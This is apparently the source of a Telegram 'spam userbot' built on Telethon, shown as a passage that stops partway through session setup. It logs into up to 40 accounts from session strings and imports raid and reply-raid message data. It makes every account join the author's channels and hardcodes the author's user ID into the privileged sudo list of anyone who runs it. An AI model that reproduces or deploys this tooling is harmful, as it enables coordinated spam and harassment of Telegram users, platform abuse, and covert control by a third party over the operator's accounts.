# RiZoeLXSpam - Spam Userbots
# Copyright © 2021 @RiZoeLX
import os
import sys
import random
import asyncio
import glob
import re
from sys import argv
from pathlib import Path
import inspect
import logging
import time
#from time import time
from datetime import datetime
import telethon.utils
from telethon.tl import functions, types
from telethon import TelegramClient, events, version
from telethon.sessions import StringSession
from decouple import config
from os import getenv
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.types import InputStickerSetID, InputStickerSetShortName
from resources.data import * # RiZoeLX, RAID, GROUP, GRP, REPLYRAID, TheRiZoeL, PORMS
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerChannel
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError, FloodWaitError, RPCError
from telethon.tl.types import Channel, Chat, InputPhoto, User
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

rizoelversion = "v2.0.4"
StartTime = time.time()

API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
ALIVE_MSG = config("ALIVE_MSG", default=None)
PING_MSG = config("PING_MSG", default=None)
hl = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
DEV = list(map(int, getenv("FULLSUDO").split()))
if 1517994352 not in DEV:
    DEV.append(1517994352)
OWNER_ID = int(os.environ.get("OWNER_ID", None))
DEV.append(OWNER_ID)
CLIENTS = []
XX = [1517994352]
XX.append(OWNER_ID)
# Sessions
async def RiZoeLX():
    global Riz
    global Riz2
    global Riz3
    global Riz5
    global Riz4
    global Riz6
    global Riz7
    global Riz8
    global Riz9
    global Riz10
    global Riz11
    global Riz12
    global Riz13
    global Riz14
    global Riz15
    global Riz16
    global Riz17
    global Riz18
    global Riz19
    global Riz20
    global Riz21
    global Riz22
    global Riz23
    global Riz25
    global Riz24
    global Riz26
    global Riz27
    global Riz28
    global Riz29
    global Riz30
    global Riz31
    global Riz32
    global Riz33
    global Riz34
    global Riz35
    global Riz36
    global Riz37
    global Riz38
    global Riz39
    global Riz40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Riz.start()
            botme = await Riz.get_me()
            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_1 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_1)
        except Exception as e:
            Riz = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "rizoelxspam"
        Riz = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz.start()
        except Exception as e:
            pass
   
    if STRING2: 
        session_name = str(STRING2)
        print("String 2 Found")
        Riz2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Riz2.start()
            await Riz2(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz2(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz2(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz2.get_me()
            id_2 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_2)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "rizoelxspam"
        Riz2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz2.start()
        except Exception as e:
            pass

    if STRING3: 
        session_name = str(STRING3)
        print("String 3 Found")
        Riz3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Riz3.start()
            await Riz3(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz3(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz3(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz3.get_me()
            id_3 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_3)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "rizoelxspam"
        Riz3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz3.start()
        except Exception as e:
            pass

    if STRING4: 
        session_name = str(STRING4)
        print("String 4 Found")
        Riz4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Riz4.start()
            await Riz4(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz4(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz4(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz4.get_me()
            id_4 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_4)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "rizoelxspam"
        Riz4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz4.start()
        except Exception as e:
            pass

    if STRING5: 
        session_name = str(STRING5)
        print("String 5 Found")
        Riz5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Riz5.start()
            await Riz5(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz5(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz5(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz5.get_me()
            id_5 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_5)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "rizoelxspam"
        Riz5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz5.start()
        except Exception as e:
            pass
                  
    if STRING6: 
        session_name = str(STRING6)
        print("String 6 Found")
        Riz6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Riz6.start()
            await Riz6(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz6(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz6(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz6.get_me()
            id_6 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_6)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "rizoelxspam"
        Riz6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz6.start()
        except Exception as e:
            pass

    if STRING7: 
        session_name = str(STRING7)
        print("String 7 Found")
        Riz7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Riz7.start()
            await Riz7(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz7(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz7(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz7.get_me()
            id_7 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_7)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "rizoelxspam"
        Riz7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz7.start()
        except Exception as e:
            pass    
        
    
    if STRING8: 
        session_name = str(STRING8)
        print("String 8 Found")
        Riz8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Riz8.start()
            await Riz8(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz8(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz8(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz8.get_me()
            id_8 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_8)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "rizoelxspam"
        Riz8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz8.start()
        except Exception as e:
            pass   
        
    if STRING9: 
        session_name = str(STRING9)
        print("String 9 Found")
        Riz9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Riz9.start()
            await Riz9(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz9(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz9(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz9.get_me()
            id_9 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_9)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "rizoelxspam"
        Riz9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz9.start()
        except Exception as e:
            pass   
    
  
    if STRING10: 
        session_name = str(STRING10)
        print("String 10 Found")
        Riz10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Riz10.start()
            await Riz10(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz10(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz10(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz10.get_me()
            id_10 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_10)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "rizoelxspam"
        Riz10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz10.start()
        except Exception as e:
            pass 
        
    
    if STRING11: 
        session_name = str(STRING11)
        print("String 11 Found")
        Riz11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Riz11.start()
            await Riz11(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz11(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz11(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz11.get_me()
            id_11 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_11)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "rizoelxspam"
        Riz11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz11.start()
        except Exception as e:
            pass
        
    
    if STRING12: 
        session_name = str(STRING12)
        print("String 12 Found")
        Riz12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Riz12.start()
            await Riz12(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz12(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz12(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz12.get_me()
            id_12 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_12)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "rizoelxspam"
        Riz12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz12.start()
        except Exception as e:
            pass   
    
  
    if STRING13: 
        session_name = str(STRING13)
        print("String 13  Found")
        Riz13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Riz13.start()
            await Riz13(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz13(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz13(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz13.get_me()
            id_13 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_13)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "rizoelxspam"
        Riz13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz13.start()
        except Exception as e:
            pass 
        
    
    if STRING14: 
        session_name = str(STRING14)
        print("String 14 Found")
        Riz14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Riz14.start()
            await Riz14(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz14.get_me()
            id_14 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_14)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "rizoelxspam"
        Riz14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz14.start()
        except Exception as e:
            pass
        
    
    if STRING15: 
        session_name = str(STRING15)
        print("String 15 Found")
        Riz15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Riz15.start()
            await Riz15(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz15.get_me()
            id_15 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_15)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "rizoelxspam"
        Riz15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz15.start()
        except Exception as e:
            pass


    if STRING16: 
        session_name = str(STRING16)
        print("String 16 Found")
        Riz16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Riz16.start()
            botme = await Riz16.get_me()
            await Riz16(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_16 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_16)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "rizoelxspam"
        Riz16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz16.start()
        except Exception as e:
            pass
   
    if STRING17: 
        session_name = str(STRING17)
        print("String 17 Found")
        Riz17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Riz17.start()
            botme = await Riz17.get_me()
            await Riz17(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_17 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_17)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "rizoelxspam"
        Riz17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz17.start()
        except Exception as e:
            pass
   
    if STRING18: 
        session_name = str(STRING18)
        print("String 18 Found")
        Riz18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Riz18.start()
            botme = await Riz18.get_me()
            await Riz18(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_18 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_18)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "rizoelxspam"
        Riz18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz18.start()
        except Exception as e:
            pass
   
    if STRING19: 
        session_name = str(STRING19)
        print("String 19 Found")
        Riz19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Riz19.start()
            botme = await Riz19.get_me()
            await Riz19(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_19 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_19)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "rizoelxspam"
        Riz19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz.start()
        except Exception as e:
            pass
   
    if STRING20: 
        session_name = str(STRING20)
        print("String 20 Found")
        Riz20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Riz20.start()
            botme = await Riz20.get_me()
            await Riz20(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_20 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_20)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "rizoelxspam"
        Riz20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz20.start()
        except Exception as e:
            pass

    if STRING21: 
        session_name = str(STRING21)
        print("String 21 Found")
        Riz21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Riz21.start()
            botme = await Riz21.get_me()
            await Riz21(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            id_21 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_21)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "rizoelxspam"
        Riz21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz21.start()
        except Exception as e:
            pass
   
    if STRING22: 
        session_name = str(STRING22)
        print("String 22 Found")
        Riz22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Riz22.start()
            await Riz22(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz22.get_me()
            id_22 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_22)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "rizoelxspam"
        Riz22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz22.start()
        except Exception as e:
            pass

    if STRING23: 
        session_name = str(STRING23)
        print("String 23 Found")
        Riz23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Riz23.start()
            await Riz23(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz23.get_me()
            id_23 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_23)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "rizoelxspam"
        Riz23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz23.start()
        except Exception as e:
            pass

    if STRING24: 
        session_name = str(STRING24)
        print("String 24 Found")
        Riz24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Riz24.start()
            await Riz24(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz24.get_me()
            id_24 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_24)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "rizoelxspam"
        Riz24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz24.start()
        except Exception as e:
            pass

    if STRING25: 
        session_name = str(STRING25)
        print("String 25 Found")
        Riz25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Riz25.start()
            await Riz25(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz25.get_me()
            id_25 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_25)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "rizoelxspam"
        Riz25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz25.start()
        except Exception as e:
            pass
                  
    if STRING26: 
        session_name = str(STRING26)
        print("String 36 Found")
        Riz26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Riz26.start()
            await Riz26(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz26.get_me()
            id_26 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_26)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "rizoelxspam"
        Riz26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz26.start()
        except Exception as e:
            pass

    if STRING27: 
        session_name = str(STRING27)
        print("String 27 Found")
        Riz27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Riz27.start()
            await Riz27(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz27.get_me()
            id_27 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_27)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "rizoelxspam"
        Riz27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz27.start()
        except Exception as e:
            pass    
        
    
    if STRING28: 
        session_name = str(STRING28)
        print("String 28 Found")
        Riz28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Riz28.start()
            await Riz28(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz28.get_me()
            id_28 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_28)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "rizoelxspam"
        Riz28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz28.start()
        except Exception as e:
            pass   
        
    if STRING29: 
        session_name = str(STRING29)
        print("String 29 Found")
        Riz29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Riz29.start()
            await Riz29(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz29.get_me()
            id_29 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_29)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "rizoelxspam"
        Riz29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz29.start()
        except Exception as e:
            pass   
    
  
    if STRING30: 
        session_name = str(STRING30)
        print("String 30 Found")
        Riz30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Riz30.start()
            await Riz30(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz30.get_me()
            id_30 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_30)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "rizoelxspam"
        Riz30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz30.start()
        except Exception as e:
            pass 
        
    
    if STRING31: 
        session_name = str(STRING31)
        print("String 31 Found")
        Riz31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Riz31.start()
            await Riz31(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz31.get_me()
            id_31 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_31)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "rizoelxspam"
        Riz31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz31.start()
        except Exception as e:
            pass
        
    
    if STRING32: 
        session_name = str(STRING32)
        print("String 32 Found")
        Riz32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Riz32.start()
            await Riz32(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz32.get_me()
            id_32 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_32)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "rizoelxspam"
        Riz32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz32.start()
        except Exception as e:
            pass   
    
  
    if STRING33: 
        session_name = str(STRING33)
        print("String 33  Found")
        Riz33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Riz33.start()
            await Riz33(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz33.get_me()
            id_33 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_33)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "rizoelxspam"
        Riz33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz33.start()
        except Exception as e:
            pass 
        
    
    if STRING34: 
        session_name = str(STRING34)
        print("String 34 Found")
        Riz34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Riz34.start()
            await Riz34(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz34.get_me()
            id_34 = telethon.utils.get_peer_id(botme)
            CLIENTS.append(id_34)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "rizoelxspam"
        Riz34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz34.start()
        except Exception as e:
            pass
        
    
    if STRING35: 
        session_name = str(STRING35)
